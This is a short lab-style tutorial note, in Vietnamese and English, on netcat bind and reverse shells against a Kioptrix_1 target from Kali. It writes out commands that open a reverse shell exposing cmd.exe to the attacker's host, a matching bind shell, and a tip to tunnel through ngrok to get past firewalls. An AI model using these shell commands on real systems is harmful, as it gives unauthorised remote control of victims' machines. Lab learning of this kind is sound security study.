@@ -1,0 +1,53 @@
+Introduction to Netcat
+
+Connecting vs Listening
+
+Bind Shells
+- Attaker conntects to victim on listening port
+Trường hợp này thông thường sử dụng để thu thập botnets,không có tường lửa bảo vệ,
+hoặc chung lớp mạng với máy attacker (Có thể dùng sau khi pivot thành công).
+Reverse Shells
+- Victim connects to attacker on listening port
+Vì tính chất hoạt động linh hoạt nên phương thức này đa số được sử dụng trong các cuộc tấn công 
+vào hệ thống.
+
+Sử dựng netcat để dò port đang mở trên máy chủ Kioptrix_1
+
+nc -nv 192.168.27.163 443
+
+options analysis:
+-n: numeric-only IP addresses, no DNS (sử dụng duy nhất địa chỉ IP, không qua phân giải DNS, không hostname)
+-v: verbose [use twice to be more verbose]
+
+################################################
+Kịch bản Reverse shell
+Sử dụng netcat để lắng nghe các kết nối đến
+
+nc -nvlp 4444
+
+options analysis:
+-l: listen mode, for inbound connects (Lắng nghe các kết nối từ bên ngoài đến hệ thống)
+-p: local port number (Sử dụng 1 port không trùng để mở dịch vụ netcat thông qua, đảm bảo không trùng port với các dịch vụ khác)
+
+Trên máy victim, ta sử dụng lệnh sau để kết nối đến máy Kali và cho phép sử dụng chạy cmd.exe
+thông qua netcat (remote controll cmd.exe)
+
+download phần mềm netcat ở link sau:
+https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
+
+Sau đó chạy chương trình với quyền administrator và gõ lệnh:
+
+-nv 192.168.27.163 -e cmd.exe
+
+Quay lại máy chủ Kali để kiểm tra kết quả.
+
+
+################################################
+
+Kịch bản bind shell
+Ở trên máy victim chạy câu lệnh sau:
+-nvlp 4444 -e cmd.exe
+Quay lại máy Kali và chạy câu lệnh kết nối đến:
+nc -nv 192.168.27.128 4444
+
+Cách này có thể kết hợp với ngrok để bypass firewall và kết nối netcat qua môi trường internet.
